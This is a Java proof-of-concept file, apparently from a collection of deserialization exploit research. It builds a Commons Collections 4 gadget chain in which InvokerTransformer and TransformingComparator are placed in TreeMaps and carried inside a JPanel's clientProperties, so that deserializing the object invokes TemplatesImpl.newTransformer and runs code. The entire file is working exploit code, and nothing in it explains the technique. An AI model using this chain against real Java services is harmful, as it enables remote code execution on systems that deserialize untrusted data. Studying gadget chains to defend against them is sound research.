package com.example.CC4;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.swing.*;
import java.util.TreeMap;

public class POC_9 {

    /***
     * run with jComponent_equals.jar
     */

    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Share.getTemplatesImplObj();

        Transformer transformer = new InvokerTransformer("toString", new Class[]{}, new Object[]{});
        TransformingComparator comparator  = new TransformingComparator(transformer);

        TreeMap treeMap1 = new TreeMap(comparator);
        treeMap1.put(templates, "aaa");
        TreeMap treeMap2 = new TreeMap(comparator);
        treeMap2.put(templates, "aaa");

        ReflectionUtil.setField(transformer, "iMethodName", "newTransformer");
        JPanel j = new JPanel();
        Class atClass = Class.forName("javax.swing.ArrayTable");
        Object arrayTable = ReflectionUtil.createWithoutConstructor(atClass);
        Object[] table = new Object[]{treeMap1, "1", treeMap2, "2"};

        ReflectionUtil.setField(arrayTable, "table", table);
        ReflectionUtil.setField(j, "clientProperties", arrayTable);
        SerializeUtil.deserialize(SerializeUtil.serialize(j));
    }

}
